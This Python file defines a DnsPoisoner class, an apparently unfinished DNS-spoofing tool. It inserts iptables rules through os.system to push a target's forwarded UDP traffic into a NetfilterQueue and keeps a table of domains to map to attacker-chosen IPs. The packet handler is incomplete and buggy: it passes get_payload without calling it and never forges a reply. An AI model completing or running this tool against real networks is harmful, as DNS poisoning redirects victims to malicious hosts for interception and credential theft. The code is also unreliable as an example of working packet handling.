from scapy.all import *
from netfilterqueue import NetfilterQueue
import multiprocessing
import os

class DnsPoisoner(multiprocessing.Process):

    def __init__(self, ip, queue_num):

        multiprocessing.Process.__init__(self)

        self.urls_to_spoof = {}
        self.queue         = NetfilterQueue()
        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip, queue_num)
        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip, queue_num)
        self.exit          = False

        self.queue.bind(queue_num, self.handle_packet)

    def add_url(self, url, ip):
        self.urls_to_spoof[url] = ip

    def handle_packet(self, packet):

        packet_scapy = IP(packet.get_payload)

    def run(self):

        os.system(self.iprule_add)
        self.queue.run()

        while not self.exit:
            time.sleep(1)

        self.queue.unbind()

    def stop(self):

        os.system(self.iprule_remove)
        self.exit = True
